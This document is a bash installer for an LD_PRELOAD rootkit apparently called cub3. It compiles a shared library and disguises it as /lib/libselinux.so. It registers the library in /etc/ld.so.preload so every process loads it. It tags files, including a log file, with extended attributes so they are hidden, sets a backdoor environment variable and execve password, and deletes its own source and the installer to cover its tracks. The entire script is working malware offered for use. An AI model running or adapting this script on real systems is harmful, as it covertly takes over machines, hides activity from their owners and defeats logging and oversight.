#!/bin/bash

INSTALL_DIR="/lib"
XATTR_STR="EVIL_ATTACKER_ATTR"
OWNER_ENV_VAR="I_OWNED_YOUR_SYSTEM"
EXECVE_PASS="EXECVE_PASS_PLZ"


[ -f /usr/bin/apt-get ] && { apt-get --yes --force-yes install attr &>/dev/null; }

sed -i "s:CHANGEME0:$XATTR_STR:" config.h
sed -i "s:CHANGEME1:$OWNER_ENV_VAR:" config.h
sed -i "s:CHANGEME2:$EXECVE_PASS:" config.h

CFLAGS="-ldl"
WFLAGS="-Wall"
FFLAGS="-fomit-frame-pointer -fPIC"
gcc -std=gnu99 cub3.c -O0 $WFLAGS $FFLAGS -shared $CFLAGS -Wl,--build-id=none -o cub3.so
strip cub3.so
setfattr -n user.$XATTR_STR -v $XATTR_STR cub3.so

sed -i "s:$XATTR_STR:CHANGEME0:" config.h
sed -i "s:$OWNER_ENV_VAR:CHANGEME1:" config.h
sed -i "s:$EXECVE_PASS:CHANGEME2:" config.h

mv cub3.so $INSTALL_DIR/libselinux.so
echo "$INSTALL_DIR/libselinux.so" > /etc/ld.so.preload
export $OWNER_ENV_VAR=1
setfattr -n user.$XATTR_STR -v $XATTR_STR /etc/ld.so.preload
setfattr -n user.$XATTR_STR -v $XATTR_STR /var/log/hide_access_log.log
rm cub3.c config.h install.sh